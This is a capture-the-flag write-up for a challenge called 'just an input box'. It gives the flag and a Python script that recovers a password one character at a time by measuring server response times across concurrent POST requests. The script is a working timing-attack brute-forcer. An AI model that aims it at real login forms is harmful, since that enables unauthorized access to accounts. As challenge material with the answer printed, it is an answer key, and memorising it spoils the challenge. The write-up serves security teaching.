# just an input box
why is there just an input box...
139.59.46.128:2345

## Flag 
enc0re{5hm0ll_fl4g}

## Solution
1. you have to bruteforce the input field in the website
2. character by character bruteforce has to be done not word
3. You will notice that one character takes a lot of time to load as compared to other character, this means that character is correct.
4. You can make a script or do this manually by trying all characters and specials chars.

Script:

```python
from __future__ import print_function

from requests_futures.sessions import FuturesSession
import string
import sys

server = "http://139.59.46.128:2345/"

flag = "enc0re{"

if sys.stdout.isatty():
    print(flag, end="\r")
    sys.stdout.flush()

with FuturesSession(max_workers=len(string.printable)) as session:
    while not flag.endswith("}"):
        futures = [session.post(server, data={"password": flag + char}) for char in string.printable]

        flag += max(zip((future.result().elapsed for future in futures), string.printable))[1]

        if sys.stdout.isatty():
            print(flag, end="\r")
            sys.stdout.flush()

print(flag)
```
